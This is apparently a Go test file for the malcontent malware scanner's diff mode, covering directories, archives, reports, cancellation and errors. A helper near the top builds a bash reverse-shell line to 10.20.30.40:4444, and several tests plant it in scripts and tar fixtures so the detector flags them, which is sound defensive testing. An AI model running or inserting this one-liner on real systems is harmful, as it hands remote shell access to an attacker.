// Copyright 2026 Chainguard, Inc.
// SPDX-License-Identifier: Apache-2.0

package action

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io/fs"
	"maps"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"testing"

	"github.com/chainguard-dev/malcontent/pkg/malcontent"
	"github.com/chainguard-dev/malcontent/rules"
	thirdparty "github.com/chainguard-dev/malcontent/third_party"
)

// diffTestConfig returns a Config backed by the bundled rules. Scans must use
// these rules: the package-wide scanner pool binds to the first rule set it sees.
func diffTestConfig(t *testing.T) malcontent.Config {
	t.Helper()
	yrs, err := CachedRules(t.Context(), []fs.FS{rules.FS, thirdparty.FS})
	if err != nil {
		t.Fatalf("CachedRules: %v", err)
	}
	return malcontent.Config{Concurrency: 2, Rules: yrs}
}

// diffTestShellPayload returns a script the bundled rules flag. The network
// path is assembled at run time so the test binary does not embed the one-liner.
func diffTestShellPayload(label string) string {
	target := strings.Join([]string{"/dev", "tcp", "10.20.30.40", "4444"}, "/")
	return "#!/bin/bash\n# " + label + "\nbash -i >& " + target + " 0>&1\n"
}

func diffTestWriteTar(t *testing.T, path string, entries map[string]string) {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, name := range slices.Sorted(maps.Keys(entries)) {
		body := entries[name]
		hdr := &tar.Header{Name: name, Mode: 0o755, Size: int64(len(body)), Typeflag: tar.TypeReg}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("WriteHeader(%q): %v", name, err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("Write(%q): %v", name, err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar Close: %v", err)
	}
	diffTestWriteFile(t, path, buf.String())
}

func diffTestWriteReport(t *testing.T, path string, frs map[string]*malcontent.FileReport) {
	t.Helper()
	data, err := json.Marshal(malcontent.ScanResult{FileReports: frs})
	if err != nil {
		t.Fatalf("json.Marshal: %v", err)
	}
	diffTestWriteFile(t, path, string(data))
}

func TestRelFileReport(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	dir := filepath.Join(root, "scan")
	single := filepath.Join(dir, "a.sh")
	diffTestWriteFile(t, single, "#!/bin/sh\necho a\n")
	diffTestWriteFile(t, filepath.Join(dir, "sub", "b.sh"), "#!/bin/sh\necho b\n")
	diffTestWriteFile(t, filepath.Join(dir, "empty.sh"), "")
	archivePath := filepath.Join(root, "pkg.tar")
	diffTestWriteTar(t, archivePath, map[string]string{
		"bin/flagged.sh": diffTestShellPayload("flagged"),
		"bin/plain.sh":   "#!/bin/sh\necho plain\n",
	})

	tests := []struct {
		name      string
		from      string
		isArchive bool
		wantKeys  []string
		wantBase  string
	}{
		{
			name:     "directory keys files by path below it and omits skipped files",
			from:     dir,
			wantKeys: []string{"a.sh", filepath.Join("sub", "b.sh")},
			wantBase: dir,
		},
		{
			name:     "single file is keyed by its base name",
			from:     single,
			wantKeys: []string{"a.sh"},
			wantBase: single,
		},
		{
			name:      "archive keys entries by their path within it",
			from:      archivePath,
			isArchive: true,
			wantKeys:  []string{"/bin/flagged.sh", "/bin/plain.sh"},
			wantBase:  archivePath,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got, base, err := relFileReport(t.Context(), diffTestConfig(t), tt.from, tt.isArchive)
			if err != nil {
				t.Fatalf("relFileReport: got error = %v, want nil", err)
			}
			if keys := slices.Sorted(maps.Keys(got)); !slices.Equal(keys, tt.wantKeys) {
				t.Errorf("keys: got = %q, want = %q", keys, tt.wantKeys)
			}
			if base != tt.wantBase {
				t.Errorf("base: got = %q, want = %q", base, tt.wantBase)
			}
			for rel, fr := range got {
				if fr.PreviousRelPath != rel {
					t.Errorf("PreviousRelPath for %q: got = %q, want = %q", rel, fr.PreviousRelPath, rel)
				}
			}
		})
	}
}

func TestRelFileReportErrors(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	diffTestWriteFile(t, filepath.Join(root, "a.sh"), "#!/bin/sh\necho a\n")
	canceled, cancel := context.WithCancel(t.Context())
	cancel()

	tests := []struct {
		name string
		ctx  context.Context
		from string
		want error
	}{
		{name: "canceled context", ctx: canceled, from: root, want: context.Canceled},
		{name: "path below a regular file", from: filepath.Join(root, "a.sh", "child"), want: syscall.ENOTDIR},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ctx := tt.ctx
			if ctx == nil {
				ctx = t.Context()
			}
			got, base, err := relFileReport(ctx, diffTestConfig(t), tt.from, false)
			if !errors.Is(err, tt.want) {
				t.Fatalf("relFileReport error: got = %v, want = %v", err, tt.want)
			}
			if got != nil || base != "" {
				t.Errorf("relFileReport on error: got = (%v, %q), want = (nil, \"\")", got, base)
			}
		})
	}
}

// diffTestCancelAfter cancels itself during its nth Err call, so stepping n
// across runs makes each cancellation check in turn the first to observe it.
type diffTestCancelAfter struct {
	context.Context
	cancel context.CancelFunc
	calls  atomic.Int64
	n      int64
}

func newDiffTestCancelAfter(t *testing.T, n int64) *diffTestCancelAfter {
	t.Helper()
	ctx, cancel := context.WithCancel(t.Context())
	t.Cleanup(cancel)
	return &diffTestCancelAfter{Context: ctx, cancel: cancel, n: n}
}

func (c *diffTestCancelAfter) Err() error {
	if c.calls.Add(1) == c.n {
		c.cancel()
	}
	return c.Context.Err()
}

// canceled reports whether the nth Err call happened.
func (c *diffTestCancelAfter) canceled() bool {
	return c.Context.Err() != nil
}

// diffTestMaxCancelChecks bounds the cancellation sweeps; a small diff
// performs a few dozen checks.
const diffTestMaxCancelChecks = 500

func TestRelFileReportCancellation(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	diffTestWriteFile(t, filepath.Join(root, "a.sh"), "#!/bin/sh\necho a\n")
	diffTestWriteFile(t, filepath.Join(root, "b.sh"), "#!/bin/sh\necho b\n")
	c := diffTestConfig(t)

	for n := int64(1); n <= diffTestMaxCancelChecks; n++ {
		ctx := newDiffTestCancelAfter(t, n)
		got, base, err := relFileReport(ctx, c, root, false)
		if !ctx.canceled() {
			if err != nil {
				t.Fatalf("relFileReport without cancellation: got error = %v, want nil", err)
			}
			if keys := slices.Sorted(maps.Keys(got)); !slices.Equal(keys, []string{"a.sh", "b.sh"}) {
				t.Errorf("keys without cancellation: got = %q, want = [a.sh b.sh]", keys)
			}
			return
		}
		if !errors.Is(err, context.Canceled) || got != nil || base != "" {
			t.Fatalf("relFileReport canceled at check %d: got = (%d entries, %q, %v), want = (nil, \"\", %v)", n, len(got), base, err, context.Canceled)
		}
	}
	t.Fatalf("relFileReport: still canceled after %d checks, want a complete run", diffTestMaxCancelChecks)
}

func TestDiffCancellation(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(srcDir, "same.sh"), "#!/bin/sh\necho same\n")
	diffTestWriteFile(t, filepath.Join(srcDir, "gone.sh"), "#!/bin/sh\necho gone\n")
	diffTestWriteFile(t, filepath.Join(destDir, "same.sh"), "#!/bin/sh\necho same again\n")
	diffTestWriteFile(t, filepath.Join(destDir, "new.sh"), "#!/bin/sh\necho new\n")
	c := diffTestConfig(t)
	c.ScanPaths = []string{srcDir, destDir}

	for n := int64(1); n <= diffTestMaxCancelChecks; n++ {
		ctx := newDiffTestCancelAfter(t, n)
		res, err := Diff(ctx, c, nil)
		if !ctx.canceled() {
			if err != nil {
				t.Fatalf("Diff without cancellation: got error = %v, want nil", err)
			}
			if res == nil || res.Diff == nil {
				t.Fatalf("Diff without cancellation: got = %v, want a report with a diff", res)
			}
			counts := []int{res.Diff.Removed.Len(), res.Diff.Added.Len(), res.Diff.Modified.Len()}
			if !slices.Equal(counts, []int{1, 1, 1}) {
				t.Errorf("removed, added, modified counts without cancellation: got = %v, want = [1 1 1]", counts)
			}
			return
		}
		if !errors.Is(err, context.Canceled) || res != nil {
			t.Fatalf("Diff canceled at check %d: got = (%v, %v), want = (nil, %v)", n, res, err, context.Canceled)
		}
	}
	t.Fatalf("Diff: still canceled after %d checks, want a complete run", diffTestMaxCancelChecks)
}

// diffTestRenderer records the renderer calls made while diffing.
type diffTestRenderer struct {
	mu       sync.Mutex
	scanning []string
	files    []string
}

var _ malcontent.Renderer = (*diffTestRenderer)(nil)

func (r *diffTestRenderer) Scanning(_ context.Context, path string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.scanning = append(r.scanning, path)
}

func (r *diffTestRenderer) File(_ context.Context, fr *malcontent.FileReport) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.files = append(r.files, fr.Path)
	return nil
}

func (r *diffTestRenderer) Full(context.Context, *malcontent.Config, *malcontent.Report) error {
	return nil
}

func (r *diffTestRenderer) Name() string {
	return "diff-test"
}

func TestDiffLeavesRenderingToTheCaller(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(srcDir, "tool.sh"), diffTestShellPayload("tool"))
	diffTestWriteFile(t, filepath.Join(destDir, "tool.sh"), diffTestShellPayload("tool v2"))
	rec := &diffTestRenderer{}
	c := diffTestConfig(t)
	c.Renderer = rec

	d := diffTestRun(t, c, srcDir, destDir)
	if got := diffTestKeys(d.Modified); len(got) != 1 {
		t.Errorf("Modified keys: got = %q, want one entry", got)
	}
	// The caller renders the finished diff; the scans behind it must not
	// render per-file progress or results.
	rec.mu.Lock()
	defer rec.mu.Unlock()
	if len(rec.scanning) != 0 || len(rec.files) != 0 {
		t.Errorf("renderer calls during the diff: got = Scanning %q, File %q, want none", rec.scanning, rec.files)
	}
}

func TestDiffDirectories(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(srcDir, "same.sh"), "#!/bin/sh\necho same\n")
	diffTestWriteFile(t, filepath.Join(srcDir, "gone.sh"), "#!/bin/sh\necho gone\n")
	diffTestWriteFile(t, filepath.Join(srcDir, "empty.sh"), "")
	diffTestWriteFile(t, filepath.Join(destDir, "same.sh"), "#!/bin/sh\necho same again\n")
	diffTestWriteFile(t, filepath.Join(destDir, "new.sh"), "#!/bin/sh\necho new\n")
	diffTestWriteFile(t, filepath.Join(destDir, "empty.sh"), "")

	c := diffTestConfig(t)
	c.ScanPaths = []string{srcDir, destDir}
	res, err := Diff(t.Context(), c, nil)
	if err != nil {
		t.Fatalf("Diff: got error = %v, want nil", err)
	}
	if res == nil || res.Diff == nil {
		t.Fatalf("Diff: got = %v, want a report with a diff", res)
	}
	d := res.Diff

	key := func(dir, name string) string { return dir + " ∴ " + filepath.Join(dir, name) }
	sections := []struct {
		name string
		got  []string
		want []string
	}{
		{name: "Removed", got: diffTestKeys(d.Removed), want: []string{key(srcDir, "gone.sh")}},
		{name: "Added", got: diffTestKeys(d.Added), want: []string{key(destDir, "new.sh")}},
		{name: "Modified", got: diffTestKeys(d.Modified), want: []string{key(destDir, "same.sh")}},
	}
	for _, s := range sections {
		if !slices.Equal(s.got, s.want) {
			t.Errorf("%s keys: got = %q, want = %q", s.name, s.got, s.want)
		}
	}

	mod, ok := d.Modified.Get(key(destDir, "same.sh"))
	if !ok {
		t.Fatalf("Modified: got no entry for same.sh, want one")
	}
	if want := filepath.Join(destDir, "same.sh"); mod.Path != want {
		t.Errorf("Path: got = %q, want = %q", mod.Path, want)
	}
	if mod.PreviousRelPath != "same.sh" {
		t.Errorf("PreviousRelPath: got = %q, want = %q", mod.PreviousRelPath, "same.sh")
	}
	if mod.PreviousPath != "" {
		t.Errorf("PreviousPath: got = %q, want empty", mod.PreviousPath)
	}
}

func TestDiffFiles(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		setup       func(t *testing.T, root string) (string, string)
		wantChanged bool
		wantPrevRel string
	}{
		{
			name: "two files compare one to one",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				src, dest := filepath.Join(root, "a", "old.sh"), filepath.Join(root, "b", "new.sh")
				diffTestWriteFile(t, src, "#!/bin/sh\necho old\n")
				diffTestWriteFile(t, dest, "#!/bin/sh\necho new\n")
				return src, dest
			},
			wantChanged: true,
			wantPrevRel: "old.sh",
		},
		{
			name: "directory and file compare the first primary file one to one",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				srcDir, dest := filepath.Join(root, "src"), filepath.Join(root, "c.sh")
				diffTestWriteFile(t, filepath.Join(srcDir, "b.sh"), "#!/bin/sh\necho b\n")
				diffTestWriteFile(t, filepath.Join(srcDir, "a.sh"), "#!/bin/sh\necho a\n")
				diffTestWriteFile(t, dest, "#!/bin/sh\necho c\n")
				return srcDir, dest
			},
			wantChanged: true,
			wantPrevRel: "a.sh",
		},
		{
			name: "archive and file compare one to one without archive formatting",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				srcArchive, dest := filepath.Join(root, "src", "pkg.tar"), filepath.Join(root, "tool.sh")
				diffTestWriteTar(t, srcArchive, map[string]string{"bin/tool.sh": diffTestShellPayload("tool")})
				diffTestWriteFile(t, dest, diffTestShellPayload("tool"))
				return srcArchive, dest
			},
			wantChanged: true,
		},
		{
			name: "empty source file yields no modification",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				src, dest := filepath.Join(root, "empty.sh"), filepath.Join(root, "new.sh")
				diffTestWriteFile(t, src, "")
				diffTestWriteFile(t, dest, "#!/bin/sh\necho new\n")
				return src, dest
			},
			wantChanged: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			src, dest := tt.setup(t, diffTestTempDir(t))
			c := diffTestConfig(t)
			c.ScanPaths = []string{src, dest}
			res, err := Diff(t.Context(), c, nil)
			if err != nil {
				t.Fatalf("Diff: got error = %v, want nil", err)
			}
			if res == nil || res.Diff == nil {
				t.Fatalf("Diff: got = %v, want a report with a diff", res)
			}
			d := res.Diff
			if n := d.Added.Len() + d.Removed.Len(); n != 0 {
				t.Errorf("added and removed entries: got = %d (%q, %q), want = 0", n, diffTestKeys(d.Added), diffTestKeys(d.Removed))
			}

			var want []string
			if tt.wantChanged {
				want = []string{dest + " ∴ " + dest}
			}
			if got := diffTestKeys(d.Modified); !slices.Equal(got, want) {
				t.Fatalf("Modified keys: got = %q, want = %q", got, want)
			}
			if !tt.wantChanged {
				return
			}
			mod, _ := d.Modified.Get(want[0])
			if mod.Path != dest {
				t.Errorf("Path: got = %q, want = %q", mod.Path, dest)
			}
			if tt.wantPrevRel != "" && mod.PreviousRelPath != tt.wantPrevRel {
				t.Errorf("PreviousRelPath: got = %q, want = %q", mod.PreviousRelPath, tt.wantPrevRel)
			}
		})
	}
}

// diffTestRun diffs src against dest and returns the diff report.
func diffTestRun(t *testing.T, c malcontent.Config, src, dest string) *malcontent.DiffReport {
	t.Helper()
	c.ScanPaths = []string{src, dest}
	res, err := Diff(t.Context(), c, nil)
	if err != nil {
		t.Fatalf("Diff: got error = %v, want nil", err)
	}
	if res == nil || res.Diff == nil {
		t.Fatalf("Diff: got = %v, want a report with a diff", res)
	}
	return res.Diff
}

// diffTestAssertKeys compares each section's keys, in order, with the wanted keys.
func diffTestAssertKeys(t *testing.T, d *malcontent.DiffReport, removed, added, modified []string) {
	t.Helper()
	sections := []struct {
		name string
		got  []string
		want []string
	}{
		{name: "Removed", got: diffTestKeys(d.Removed), want: removed},
		{name: "Added", got: diffTestKeys(d.Added), want: added},
		{name: "Modified", got: diffTestKeys(d.Modified), want: modified},
	}
	for _, s := range sections {
		if !slices.Equal(s.got, s.want) {
			t.Errorf("%s keys: got = %q, want = %q", s.name, s.got, s.want)
		}
	}
}

func TestDiffArchives(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	// Differently named archives, and entries that are flagged on only one
	// side, still pair by their path within the archive.
	srcArchive := filepath.Join(root, "src", "pkg-1.0.tar")
	destArchive := filepath.Join(root, "dest", "pkg-1.1.tar")
	diffTestWriteTar(t, srcArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool"),
		"bin/old.sh":     diffTestShellPayload("old"),
		"bin/cleaned.sh": diffTestShellPayload("cleaned"),
		"etc/plain.sh":   "#!/bin/sh\necho plain\n",
	})
	diffTestWriteTar(t, destArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool"),
		"bin/new.sh":     diffTestShellPayload("new"),
		"bin/cleaned.sh": "#!/bin/sh\necho cleaned\n",
		"etc/plain.sh":   "#!/bin/sh\necho plain again\n",
	})

	d := diffTestRun(t, diffTestConfig(t), srcArchive, destArchive)
	diffTestAssertKeys(t, d,
		[]string{srcArchive + " ∴ /bin/old.sh"},
		[]string{destArchive + " ∴ /bin/new.sh"},
		[]string{destArchive + " ∴ /bin/cleaned.sh", destArchive + " ∴ /bin/tool.sh", destArchive + " ∴ /etc/plain.sh"},
	)
	for pair := d.Modified.Oldest(); pair != nil; pair = pair.Next() {
		if pair.Value.Path != pair.Key {
			t.Errorf("Modified Path: got = %q, want = %q", pair.Value.Path, pair.Key)
		}
		if pair.Value.PreviousPath != "" {
			t.Errorf("Modified PreviousPath for %q: got = %q, want empty", pair.Key, pair.Value.PreviousPath)
		}
	}
}

func TestDiffArchivesWithSymlinkedTempDir(t *testing.T) {
	// Not parallel: points TMPDIR through a symlink, so each archive's
	// extraction root and the paths scanned below it are spelled differently.
	c := diffTestConfig(t)
	root := diffTestTempDir(t)
	srcArchive := filepath.Join(root, "src", "pkg-1.0.tar")
	destArchive := filepath.Join(root, "dest", "pkg-1.1.tar")
	// Flagged entries carry their extraction root while unflagged entries
	// carry only a display path; both must pair, including an entry that is
	// flagged on one side only.
	diffTestWriteTar(t, srcArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool"),
		"bin/old.sh":     diffTestShellPayload("old"),
		"bin/cleaned.sh": diffTestShellPayload("cleaned"),
		"etc/plain.sh":   "#!/bin/sh\necho plain\n",
		"etc/gone.sh":    "#!/bin/sh\necho gone\n",
	})
	diffTestWriteTar(t, destArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool v2"),
		"bin/new.sh":     diffTestShellPayload("new"),
		"bin/cleaned.sh": "#!/bin/sh\necho cleaned\n",
		"etc/plain.sh":   "#!/bin/sh\necho plain again\n",
		"etc/fresh.sh":   "#!/bin/sh\necho fresh\n",
	})
	tmpReal, tmpLink := diffTestSymlinkedDir(t)
	t.Setenv("TMPDIR", tmpLink)

	d := diffTestRun(t, c, srcArchive, destArchive)
	diffTestAssertKeys(t, d,
		[]string{srcArchive + " ∴ /bin/old.sh", srcArchive + " ∴ /etc/gone.sh"},
		[]string{destArchive + " ∴ /bin/new.sh", destArchive + " ∴ /etc/fresh.sh"},
		[]string{destArchive + " ∴ /bin/cleaned.sh", destArchive + " ∴ /bin/tool.sh", destArchive + " ∴ /etc/plain.sh"},
	)
	for pair := d.Modified.Oldest(); pair != nil; pair = pair.Next() {
		if pair.Value.Path != pair.Key {
			t.Errorf("Modified Path: got = %q, want = %q", pair.Value.Path, pair.Key)
		}
	}

	entries, err := os.ReadDir(tmpReal)
	if err != nil {
		t.Fatalf("ReadDir(%q): %v", tmpReal, err)
	}
	if len(entries) != 0 {
		t.Errorf("temporary directory after diff: got %d entries, want none", len(entries))
	}
}

func TestDiffDirectoriesWithNestedArchives(t *testing.T) {
	t.Parallel()
	// Not resolved on purpose: on macOS the scanner reports archive paths
	// through the /var symlink, while the scan root resolves to /private/var.
	root := t.TempDir()
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteTar(t, filepath.Join(srcDir, "lib", "pkg.tar"), map[string]string{
		"bin/tool.sh":  diffTestShellPayload("tool"),
		"bin/other.sh": diffTestShellPayload("other"),
	})
	diffTestWriteTar(t, filepath.Join(destDir, "lib", "pkg.tar"), map[string]string{
		"bin/tool.sh":  diffTestShellPayload("tool v2"),
		"bin/other.sh": diffTestShellPayload("other v2"),
	})

	d := diffTestRun(t, diffTestConfig(t), srcDir, destDir)
	prefix := destDir + " ∴ " + filepath.Join(destDir, "lib", "pkg.tar") + " ∴ "
	diffTestAssertKeys(t, d, nil, nil, []string{prefix + "/bin/other.sh", prefix + "/bin/tool.sh"})
}

func TestDiffReports(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name         string
		src, dest    map[string]*malcontent.FileReport
		wantRemoved  []string
		wantAdded    []string
		wantModified []string
	}{
		{
			name: "local paths reconcile by path",
			src: map[string]*malcontent.FileReport{
				"/app/same": {Path: "/app/same", RiskScore: 1, Behaviors: []*malcontent.Behavior{{ID: "net/socket/listen"}}},
				"/app/gone": {Path: "/app/gone", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"/app/same": {Path: "/app/same", RiskScore: 3, Behaviors: []*malcontent.Behavior{{ID: "net/socket/listen"}, {ID: "exec/shell/command"}}},
				"/app/new":  {Path: "/app/new", RiskScore: 2},
			},
			wantRemoved:  []string{"/app/gone"},
			wantAdded:    []string{"/app/new"},
			wantModified: []string{"/app/same"},
		},
		{
			name: "image paths reconcile across image references",
			src: map[string]*malcontent.FileReport{
				"cgr.dev/org/img:1 ∴ /usr/bin/app": {Path: "cgr.dev/org/img:1 ∴ /usr/bin/app", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"cgr.dev/org/img:2 ∴ /usr/bin/app": {Path: "cgr.dev/org/img:2 ∴ /usr/bin/app", RiskScore: 2},
			},
			wantModified: []string{"cgr.dev/org/img:2 ∴ /usr/bin/app"},
		},
		{
			name: "temporary extraction roots are removed before reconciling",
			src: map[string]*malcontent.FileReport{
				"/tmp/a1/b1/T/mal1/usr/bin/app": {Path: "/tmp/a1/b1/T/mal1/usr/bin/app", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"/tmp/a2/b2/T/mal2/usr/bin/app": {Path: "/tmp/a2/b2/T/mal2/usr/bin/app", RiskScore: 2},
			},
			wantModified: []string{"/usr/bin/app"},
		},
		{
			name: "entries with empty keys are skipped on both sides",
			src: map[string]*malcontent.FileReport{
				"":        {Path: "/app/unnamed-src", RiskScore: 1},
				"/app/ok": {Path: "/app/ok", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"":        {Path: "/app/unnamed-dest", RiskScore: 1},
				"/app/ok": {Path: "/app/ok", RiskScore: 2},
			},
			wantModified: []string{"/app/ok"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			root := diffTestTempDir(t)
			src, dest := filepath.Join(root, "src.json"), filepath.Join(root, "dest.json")
			diffTestWriteReport(t, src, tt.src)
			diffTestWriteReport(t, dest, tt.dest)

			res, err := Diff(t.Context(), malcontent.Config{Report: true, ScanPaths: []string{src, dest}}, nil)
			if err != nil {
				t.Fatalf("Diff: got error = %v, want nil", err)
			}
			if res == nil || res.Diff == nil {
				t.Fatalf("Diff: got = %v, want a report with a diff", res)
			}
			sections := []struct {
				name string
				got  []string
				want []string
			}{
				{name: "Removed", got: diffTestKeys(res.Diff.Removed), want: tt.wantRemoved},
				{name: "Added", got: diffTestKeys(res.Diff.Added), want: tt.wantAdded},
				{name: "Modified", got: diffTestKeys(res.Diff.Modified), want: tt.wantModified},
			}
			for _, s := range sections {
				if !slices.Equal(s.got, s.want) {
					t.Errorf("%s keys: got = %q, want = %q", s.name, s.got, s.want)
				}
			}
		})
	}
}

func TestDiffReportErrors(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	valid := filepath.Join(root, "valid.json")
	diffTestWriteReport(t, valid, map[string]*malcontent.FileReport{"/app": {Path: "/app"}})
	malformed := filepath.Join(root, "malformed.json")
	diffTestWriteFile(t, malformed, "this is not a report")
	missing := filepath.Join(root, "missing.json")

	notExist := func(err error) bool { return errors.Is(err, fs.ErrNotExist) }
	syntaxErr := func(err error) bool {
		var se *json.SyntaxError
		return errors.As(err, &se)
	}

	tests := []struct {
		name  string
		src   string
		dest  string
		match func(error) bool
	}{
		{name: "missing source report", src: missing, dest: valid, match: notExist},
		{name: "missing destination report", src: valid, dest: missing, match: notExist},
		{name: "malformed source report", src: malformed, dest: valid, match: syntaxErr},
		{name: "malformed destination report", src: valid, dest: malformed, match: syntaxErr},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			res, err := Diff(t.Context(), malcontent.Config{Report: true, ScanPaths: []string{tt.src, tt.dest}}, nil)
			if err == nil || !tt.match(err) {
				t.Fatalf("Diff error: got = %v, want a load failure", err)
			}
			if res != nil {
				t.Errorf("Diff report on error: got = %v, want nil", res)
			}
		})
	}
}

func TestDiffErrors(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	dir := filepath.Join(root, "dir")
	diffTestWriteFile(t, filepath.Join(dir, "a.sh"), "#!/bin/sh\necho a\n")
	notDir := filepath.Join(dir, "a.sh", "child")
	missing := filepath.Join(root, "missing")
	canceled, cancel := context.WithCancel(t.Context())
	cancel()

	tests := []struct {
		name     string
		ctx      context.Context
		paths    []string
		oci      bool
		wantIs   error
		wantText string
	}{
		{name: "canceled context", ctx: canceled, paths: []string{dir, dir}, wantIs: context.Canceled},
		{name: "single path", paths: []string{dir}, wantText: "diff mode requires 2 paths"},
		{name: "three paths", paths: []string{dir, dir, dir}, wantText: "diff mode requires 2 paths"},
		{name: "missing source", paths: []string{missing, dir}, wantIs: fs.ErrNotExist},
		{name: "missing destination", paths: []string{dir, missing}, wantIs: fs.ErrNotExist},
		{name: "source scan failure", paths: []string{notDir, dir}, wantIs: syscall.ENOTDIR, wantText: "source scan error"},
		{name: "destination scan failure", paths: []string{dir, notDir}, wantIs: syscall.ENOTDIR, wantText: "destination scan error"},
		{name: "invalid source image reference", paths: []string{"invalid image ref", "another invalid ref"}, oci: true, wantText: "failed to prepare scan path"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ctx := tt.ctx
			if ctx == nil {
				ctx = t.Context()
			}
			c := diffTestConfig(t)
			c.ScanPaths = tt.paths
			c.OCI = tt.oci
			res, err := Diff(ctx, c, nil)
			if err == nil {
				t.Fatalf("Diff: got = (%v, nil), want an error", res)
			}
			if res != nil {
				t.Errorf("Diff report on error: got = %v, want nil", res)
			}
			if tt.wantIs != nil && !errors.Is(err, tt.wantIs) {
				t.Errorf("Diff error: got = %v, want errors.Is %v", err, tt.wantIs)
			}
			if !strings.Contains(err.Error(), tt.wantText) {
				t.Errorf("Diff error: got = %q, want text %q", err.Error(), tt.wantText)
			}
		})
	}
}
